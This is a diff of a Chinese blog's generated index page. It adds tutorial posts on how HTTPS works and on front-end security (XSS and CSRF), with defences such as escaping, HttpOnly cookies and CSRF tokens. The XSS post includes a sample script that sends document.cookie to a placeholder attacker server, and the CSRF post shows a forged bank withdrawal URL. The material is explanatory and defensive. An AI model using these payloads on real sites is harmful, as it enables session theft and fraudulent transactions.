@@ -109,7 +109,146 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/19/HOC/" data-id="cjyici91c0000hln8wplkdcmn" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/07/19/HOC/" data-id="cjyry225x0000bvn83iywajj3" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-https原理" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/19/https原理/" class="article-date">
+  <time datetime="2019-07-19T07:44:55.557Z" itemprop="datePublished">2019-07-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/19/https原理/">HTTPS原理</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>HTTPS相对HTTP来说更安全，因为HTTP是明文传输，而HTTPS相当于是在HHTP的基础上加了ssl(Secure Sockets Layer 安全套接层),ssl在传输层对网络进行加密</p>
+<h2 id="计算机网络面临的安全性威胁"><a href="#计算机网络面临的安全性威胁" class="headerlink" title="计算机网络面临的安全性威胁"></a>计算机网络面临的安全性威胁</h2><h3 id="被动攻击和主动攻击"><a href="#被动攻击和主动攻击" class="headerlink" title="被动攻击和主动攻击"></a>被动攻击和主动攻击</h3><p><img src="imgs/https/5.png" alt><br>被动攻击是指攻击者从网络上窃听他人的通信内容，通常把这类攻击称为截获，在被动攻击中攻击者只是观察和窃听某一协议数据单元而不干扰信息流。<br>主动攻击分为一下几种方式：篡改、恶意程序、拒绝服务。</p>
+<h3 id="对称加密和非对称加密"><a href="#对称加密和非对称加密" class="headerlink" title="对称加密和非对称加密"></a>对称加密和非对称加密</h3><p>当客户端传输信息给服务端的时候，如果没有加密算法，信息容易被截获甚至篡改，为了保障通信的安全，目前主要的加密方式有对称加密和非对称加密两种。</p>
+<p>对称加密：加密密钥和解密密钥是相同的 </p>
+<p>非对称加密：私钥是保密的，公钥向公众公开，信息发送方用公钥加密信息，发送给信息接受方，接收方用私钥解密信息。</p>
+<p>在实际的web通信中，只要发送方和接收方知道密钥，而其他第三方不知道，那么这种使用对称加密的方式就是可靠的，但是在实际的应用场景中，用多个客户端请求同一个服务器，当他们都使用同一个加密算法，相同都密钥的时候，这无异于是不安全的<br><img src="imgs/https/1.png" alt><br>所以实际上A端、B端。。。使用哪种加密算法不应该是固定的，而应该随机生成，像下面这个亚子<br><img src="imgs/https/2.png" alt><br>所以客户端和服务器又一个协商用那个加密算法的过程，那么，，这个协商过程，也设计到信息传输，是不是也不安全呢。。。</p>
+<p>所以协商过程也得加个密吧？协商过程怎么加密？不能再用对称加密了，不然这问题还就用无止境了。看看上图这网络结构，非对称加密还挺适合的，server有一个私钥，而其他网络节点有公钥，用私钥加密的信息公钥都能解，而公钥加密的信息只有私钥能解，服务器只要自己保存好私钥，把公钥公开，其他客户端就能用公钥加密了。</p>
+<p>因此https采用非对称加密算法来解决对称加密的协商过程那么，客户端要如何获取公钥呢？如果服务器将公钥分发，势必会出现公钥被劫持的情况吧，黑客可以劫持公钥，对服务器发出的信息进行破解<br><img src="imgs/https/3.png" alt><br>所以我们希望客户端看到的是真真正正的服务器发送过来的公钥，服务端看到的是真正客户端发送过来的信息，希望信息不被截获和篡改。这里就需要第三方对信息双方的身份进行一个确认，这就是ssl 证书的作用，ssl证书中包含了证书办法机构，有效期，公钥、证书持有者、签名，通过第三方的校验保证了身份的合法，解决了公钥获取的安全性<br><img src="imgs/https/4.png" alt><br>如上图所示，在第 ② 步时服务器发送了一个SSL证书给客户端，SSL 证书中包含的具体内容有证书的颁发机构、有效期、公钥、证书持有者、签名，通过第三方的校验保证了身份的合法，解决了公钥获取的安全性</p>
+<p>以浏览器为例说明如下整个的校验过程：</p>
+<p>（1）首先浏览器读取证书中的证书所有者、有效期等信息进行一一校验</p>
+<p>（2）浏览器开始查找操作系统中已内置的受信任的证书发布机构CA，与服务器发来的证书中的颁发者CA比对，用于校验证书是否为合法机构颁发 </p>
+<p>（3）如果找不到，浏览器就会报错，说明服务器发来的证书是不可信任的。</p>
+<p>（4）如果找到，那么浏览器就会从操作系统中取出颁发者CA的公钥，然后对服务器发来的证书里面的签名进行解密</p>
+<p>（5）浏览器使用相同的hash算法计算出服务器发来的证书的hash值，将这个计算的hash值与证书中签名做对比</p>
+<p>（6）对比结果一致，则证明服务器发来的证书合法，没有被冒充</p>
+<p>（7）此时浏览器就可以用发送过来的公钥加密对称加密算法的密钥，并把公钥加密后的密钥发送给服务器</p>
+<p>（8）服务器接收到之后用私钥解析得到对称加密算法的密钥，并用该密钥加密要传输的数据给浏览器</p>
+<p>（9）浏览器接受到数据后，用它的对称密钥解析数据</p>
+<p>总结一下：<br>HTTPS要使客户端与服务器端的通信过程得到安全保证，必须使用的对称加密算法，但是协商对称加密算法的过程，需要使用非对称加密算法来保证安全，然而直接使用非对称加密的过程本身也不安全，会有中间人篡改公钥的可能性，所以客户端与服务器不直接使用公钥，而是使用数字证书签发机构颁发的证书来保证非对称加密过程本身的安全。这样通过这些机制协商出一个对称加密算法，就此双方使用该算法进行加密解密。从而解决了客户端与服务器端之间的通信安全问题。</p>
+<h3 id="https协议的优缺点"><a href="#https协议的优缺点" class="headerlink" title="https协议的优缺点"></a>https协议的优缺点</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>使用https可以认证用户和服务器，确保数据发送到正确的客户机和服务器；<br>https协议是由SSL+http协议构建的课进行加密传输、身份认证的网络协议，要比http协议安全，可防止数据在传输过程中不被窃取、改变，确保数据的完整性；</p>
+<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>https握手阶段比较费时，会使页面加载时间延长50%，增加10%～20%的耗电。<br>https缓存不如http高效，会增加数据开销。<br>SSL证书需要费用，越强大的证书费用越高<br>SSL证书需要绑定IP，不能在同一个ip上绑定多个域名，ipv4支持不了这种消耗</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/19/https原理/" data-id="cjyry22690001bvn8dyrfn212" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-前端安全" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/19/前端安全/" class="article-date">
+  <time datetime="2019-07-19T07:44:55.557Z" itemprop="datePublished">2019-07-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/19/前端安全/">前端安全</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>web前端安全虽然在平时的开发中涉及的不是很多，但也是前端综合技能领域重要的一环。无论是对于提升产品整体的安全性可靠性，还是作为技术人员自身能力的提升，了解基本常见的前端安全问题，都是非常有必要的。<br>本文主要对前端安全涉及的内容做一个梳理。</p>
+<h2 id="XSS-Cross-Site-Scripting-跨站脚本攻击"><a href="#XSS-Cross-Site-Scripting-跨站脚本攻击" class="headerlink" title="XSS(Cross-Site-Scripting)跨站脚本攻击"></a>XSS(Cross-Site-Scripting)跨站脚本攻击</h2><p>XSS是一种经常出现在Web应用中的计算机安全漏洞，它允许恶意Web用户将代码植入到提供给其他用户使用的页面中<br>正常情况下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php <span class="variable">$userName</span> = <span class="string">"***"</span> ?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">    &lt;body&gt;  </span><br><span class="line">        &lt;div&gt; 用户名： &lt;? php <span class="built_in">echo</span> <span class="variable">$userName</span>;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在XSS攻击的时候，如果后端给前端是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php $userName = &quot;&lt;script&gt; alert(&apos;***&apos;)&lt;/script&gt;&quot; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>由于浏览器在遇到html中的script标签的时候会解析并执行标签中的代码，如果用户名称中含有script就会被执行。因此页面会弹出一个对话框。</p>
+<p>试想，如果这里script中不是alert(‘**’),而是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;  </span><br><span class="line">    $.ajax(&#123;  </span><br><span class="line">        url:<span class="string">'黑客自己的服务器'</span>,</span><br><span class="line">        dataType:<span class="string">"jsonp"</span>,</span><br><span class="line">        data:&#123;<span class="string">"盗取的Cookie"</span>:document.cookie&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再在QQ群中引诱别人来访问就可以拿到用户在这个域名下的cookie信息</p>
+<h3 id="如何防范？"><a href="#如何防范？" class="headerlink" title="如何防范？"></a>如何防范？</h3><p>目前还是将其前端输出的数据都进行转义最稳妥，对script标签进行转义，浏览器遍布会认为其是一个标签，但是显示的时候还是会按正常方式显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php $userName = &quot;&lt;script&gt; alert(&apos;***&apos;)&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">    &lt;body&gt;  </span><br><span class="line">        &lt;div&gt; 用户名： &lt;? php <span class="built_in">echo</span> htmlentities(<span class="variable">$userName</span>);&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="升级攻击"><a href="#升级攻击" class="headerlink" title="升级攻击"></a>升级攻击</h3><p>上面我们放逐了script标签的左右尖括号，然而，黑客想出了另一种方式：用jQuery的append可以做到，究其原因就是因为家jQuery会在讲append元素变为fragment的时候，找到其中的HTML标签，在使用eval执行一遍</p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>面对这种攻击，防御方法还是进行转义。如果不幸中招了，黑客的js真的在我们的网页上执行了，我们该怎么办。其实，很多时候，我们的敏感信息都是存储在cookie中的（不要把用户机密信息放在网页中），想要阻止黑客通过js访问到cookie中的用户敏感信息。那么请使用cookie的HttpOnly属性，加上了这个属性的cookie字段，js是无法进行读写的。php的设置方法如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    setcookie(<span class="string">"userpass"</span>, <span class="string">"doctorhou-shuai"</span>, NULL, NULL, NULL, NULL, TRUE);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们通过js无法获取cookie中的设定有httpOnly的字段。</p>
+<h2 id="CSRF-Cross-Site-Request-Forgery-跨站请求伪造"><a href="#CSRF-Cross-Site-Request-Forgery-跨站请求伪造" class="headerlink" title="CSRF(Cross-Site-Request-Forgery)跨站请求伪造"></a>CSRF(Cross-Site-Request-Forgery)跨站请求伪造</h2><p>网站中的一些提交行为会被黑客利用，你在访问黑客网站的时候进行的操作会被操作到其他网站上去，比如网银网站等</p>
+<h3 id="如何攻击"><a href="#如何攻击" class="headerlink" title="如何攻击"></a>如何攻击</h3><p>攻击者盗用了你的身份，以你的名义发送请求，对服务器来说这个请求完全是合法的，但是却在用户不知强的情况下完成了攻击者所期望的一个操作。比如：一个合法却存在csrf攻击漏洞的网站A，攻击者恶意构建的网站B，用户C为网站A的信任用户</p>
+<p>CSRF攻击原理及过程如下：<br>1、用户C打开网页，浏览受信任网站A，输入用户名和密码请求登入<br>2、通过验证后，A网站返回Cookie信息给浏览器，此时登陆成功<br>3、用户未退出网站C之前，同一个浏览器，打开一个Tab，访问了网站B<br>4、用户B接到用户请求后返回一些攻击性代码，并要求访问网站A<br>5、浏览器在收到B访问A网站的请求后，在用户不知情的情况下，携带Cookie向A发出请求，A服务器不知道该请求是由B发起的，所以会根据用户C的cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行</p>
+<h4 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h4><p> 受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</p>
+<p> 黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自</a> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</p>
+<p> 这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </p>
+<h3 id="CSRF漏洞检测"><a href="#CSRF漏洞检测" class="headerlink" title="CSRF漏洞检测"></a>CSRF漏洞检测</h3><p>  检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
+<p>  随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。</p>
+<p>  以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p>
+<h3 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h3><p>目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p>
+<p>（1）验证 HTTP Referer 字段</p>
+<p>  根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆</a> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
+<p>  这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
+<p>   然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p>
+<p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
+<p> （2）在请求地址中添加 token 并验证</p>
+<p>   CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
+<p>   这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <a href="http://url?csrftoken=tokenvalue。" target="_blank" rel="noopener">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上 <input type="”hidden”" name="”csrftoken”" value="”tokenvalue”/">，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p>
+<p>   该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p>
+<p>（3）在 HTTP 头中自定义属性并验证</p>
+<p>   这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p>
+<p>   然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/19/前端安全/" data-id="cjyry226t0002bvn88r13w9nf" class="article-share-link">Share</a>
       
       
     </footer>
@@ -192,7 +331,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/19/Responsive layout/" data-id="cjyici91j0001hln8zdqasjv0" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/07/19/Responsive layout/" data-id="cjyry226v0003bvn8rexcqk8a" class="article-share-link">Share</a>
       
       
     </footer>
@@ -202,9 +341,9 @@
 
 
   
-    <article id="post-https原理" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-浏览器的标准模式和怪异模式" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2019/07/19/https原理/" class="article-date">
+    <a href="/2019/07/19/浏览器的标准模式和怪异模式/" class="article-date">
   <time datetime="2019-07-19T07:44:55.557Z" itemprop="datePublished">2019-07-19</time>
 </a>
     
@@ -216,7 +355,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/19/https原理/">HTTPS原理</a>
+      <a class="article-title" href="/2019/07/19/浏览器的标准模式和怪异模式/">浏览器的标准模式与怪异模式</a>
     </h1>
   
 
@@ -224,114 +363,20 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>HTTPS相对HTTP来说更安全，因为HTTP是明文传输，而HTTPS相当于是在HHTP的基础上加了ssl(Secure Sockets Layer 安全套接层),ssl在传输层对网络进行加密</p>
-<h2 id="计算机网络面临的安全性威胁"><a href="#计算机网络面临的安全性威胁" class="headerlink" title="计算机网络面临的安全性威胁"></a>计算机网络面临的安全性威胁</h2><h3 id="被动攻击和主动攻击"><a href="#被动攻击和主动攻击" class="headerlink" title="被动攻击和主动攻击"></a>被动攻击和主动攻击</h3><p><img src="imgs/https/5.png" alt><br>被动攻击是指攻击者从网络上窃听他人的通信内容，通常把这类攻击称为截获，在被动攻击中攻击者只是观察和窃听某一协议数据单元而不干扰信息流。<br>主动攻击分为一下几种方式：篡改、恶意程序、拒绝服务。</p>
-<h3 id="对称加密和非对称加密"><a href="#对称加密和非对称加密" class="headerlink" title="对称加密和非对称加密"></a>对称加密和非对称加密</h3><p>当客户端传输信息给服务端的时候，如果没有加密算法，信息容易被截获甚至篡改，为了保障通信的安全，目前主要的加密方式有对称加密和非对称加密两种。</p>
-<p>对称加密：加密密钥和解密密钥是相同的 </p>
-<p>非对称加密：私钥是保密的，公钥向公众公开，信息发送方用公钥加密信息，发送给信息接受方，接收方用私钥解密信息。</p>
-<p>在实际的web通信中，只要发送方和接收方知道密钥，而其他第三方不知道，那么这种使用对称加密的方式就是可靠的，但是在实际的应用场景中，用多个客户端请求同一个服务器，当他们都使用同一个加密算法，相同都密钥的时候，这无异于是不安全的<br><img src="imgs/https/1.png" alt><br>所以实际上A端、B端。。。使用哪种加密算法不应该是固定的，而应该随机生成，像下面这个亚子<br><img src="imgs/https/2.png" alt><br>所以客户端和服务器又一个协商用那个加密算法的过程，那么，，这个协商过程，也设计到信息传输，是不是也不安全呢。。。</p>
-<p>所以协商过程也得加个密吧？协商过程怎么加密？不能再用对称加密了，不然这问题还就用无止境了。看看上图这网络结构，非对称加密还挺适合的，server有一个私钥，而其他网络节点有公钥，用私钥加密的信息公钥都能解，而公钥加密的信息只有私钥能解，服务器只要自己保存好私钥，把公钥公开，其他客户端就能用公钥加密了。</p>
-<p>因此https采用非对称加密算法来解决对称加密的协商过程那么，客户端要如何获取公钥呢？如果服务器将公钥分发，势必会出现公钥被劫持的情况吧，黑客可以劫持公钥，对服务器发出的信息进行破解<br><img src="imgs/https/3.png" alt><br>所以我们希望客户端看到的是真真正正的服务器发送过来的公钥，服务端看到的是真正客户端发送过来的信息，希望信息不被截获和篡改。这里就需要第三方对信息双方的身份进行一个确认，这就是ssl 证书的作用，ssl证书中包含了证书办法机构，有效期，公钥、证书持有者、签名，通过第三方的校验保证了身份的合法，解决了公钥获取的安全性<br><img src="imgs/https/4.png" alt><br>如上图所示，在第 ② 步时服务器发送了一个SSL证书给客户端，SSL 证书中包含的具体内容有证书的颁发机构、有效期、公钥、证书持有者、签名，通过第三方的校验保证了身份的合法，解决了公钥获取的安全性</p>
-<p>以浏览器为例说明如下整个的校验过程：</p>
-<p>（1）首先浏览器读取证书中的证书所有者、有效期等信息进行一一校验</p>
-<p>（2）浏览器开始查找操作系统中已内置的受信任的证书发布机构CA，与服务器发来的证书中的颁发者CA比对，用于校验证书是否为合法机构颁发 </p>
-<p>（3）如果找不到，浏览器就会报错，说明服务器发来的证书是不可信任的。</p>
-<p>（4）如果找到，那么浏览器就会从操作系统中取出颁发者CA的公钥，然后对服务器发来的证书里面的签名进行解密</p>
-<p>（5）浏览器使用相同的hash算法计算出服务器发来的证书的hash值，将这个计算的hash值与证书中签名做对比</p>
-<p>（6）对比结果一致，则证明服务器发来的证书合法，没有被冒充</p>
-<p>（7）此时浏览器就可以用发送过来的公钥加密对称加密算法的密钥，并把公钥加密后的密钥发送给服务器</p>
-<p>（8）服务器接收到之后用私钥解析得到对称加密算法的密钥，并用该密钥加密要传输的数据给浏览器</p>
-<p>（9）浏览器接受到数据后，用它的对称密钥解析数据</p>
-<p>总结一下：<br>HTTPS要使客户端与服务器端的通信过程得到安全保证，必须使用的对称加密算法，但是协商对称加密算法的过程，需要使用非对称加密算法来保证安全，然而直接使用非对称加密的过程本身也不安全，会有中间人篡改公钥的可能性，所以客户端与服务器不直接使用公钥，而是使用数字证书签发机构颁发的证书来保证非对称加密过程本身的安全。这样通过这些机制协商出一个对称加密算法，就此双方使用该算法进行加密解密。从而解决了客户端与服务器端之间的通信安全问题。</p>
-<h3 id="https协议的优缺点"><a href="#https协议的优缺点" class="headerlink" title="https协议的优缺点"></a>https协议的优缺点</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>使用https可以认证用户和服务器，确保数据发送到正确的客户机和服务器；<br>https协议是由SSL+http协议构建的课进行加密传输、身份认证的网络协议，要比http协议安全，可防止数据在传输过程中不被窃取、改变，确保数据的完整性；</p>
-<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>https握手阶段比较费时，会使页面加载时间延长50%，增加10%～20%的耗电。<br>https缓存不如http高效，会增加数据开销。<br>SSL证书需要费用，越强大的证书费用越高<br>SSL证书需要绑定IP，不能在同一个ip上绑定多个域名，ipv4支持不了这种消耗</p>
+        <p>在HTML与CSS的标准化未完成之前，各个浏览器对于HTML和CSS的解析有各自不同的实现，而有很多旧的网页都是按照这些非标准的实现去设计的。在HTML与CSS标准确定之后，浏览器一方面要按照标准去实现对HTML与CSS的支持，另一方面又要保证对非标准的旧网页设计的后向兼容性。因此，现代的浏览器一般都有两种渲染模式：标准模式和怪异模式。在标准模式下，浏览器按照HTML与CSS标准对文档进行解析和渲染；而在怪异模式下，浏览器则按照旧有的非标准的实现方式对文档进行解析和渲染。这样的话，对于旧有的网页，浏览器启动怪异模式，就能够使得旧网页正常显示；对于新的网页，则可以启动标准模式，使得新网页能够使用HTML与CSS的标准特性。</p>
+<h2 id="浏览器如何确定使用哪种渲染模式"><a href="#浏览器如何确定使用哪种渲染模式" class="headerlink" title="浏览器如何确定使用哪种渲染模式"></a>浏览器如何确定使用哪种渲染模式</h2><p>知道了这两种渲染模式的来由，那剩下的问题就是浏览器如何能够确定应该使用哪种模式了。其实归根结底就是，浏览器如何能将旧网页与新网页区分开来。<br>平常编写网页的时候，一般都会见到HTML文档的头部会有文档类型声明：DOCTYPE。当浏览器遇到正确的文档声明时，浏览器就会启动标准模式，按照制定的文档类型标准解析和渲染文档。而对于旧有的网页，由于网页编写的当时标准还没有确定，所以一般是不会有文档类型声明的。所以，对于没有文档类型声明或者文档类型声明不正确的文档，浏览器就会认为它是一个旧的HTML文档，就会使用怪异模式解析和渲染该文档。关于DOCTYPE的更详细说明，请戳这里 DOCTYPE声明作用及用法详解。</p>
+<h2 id="标准模式与怪异模式的两个常见区别"><a href="#标准模式与怪异模式的两个常见区别" class="headerlink" title="标准模式与怪异模式的两个常见区别"></a>标准模式与怪异模式的两个常见区别</h2><ol>
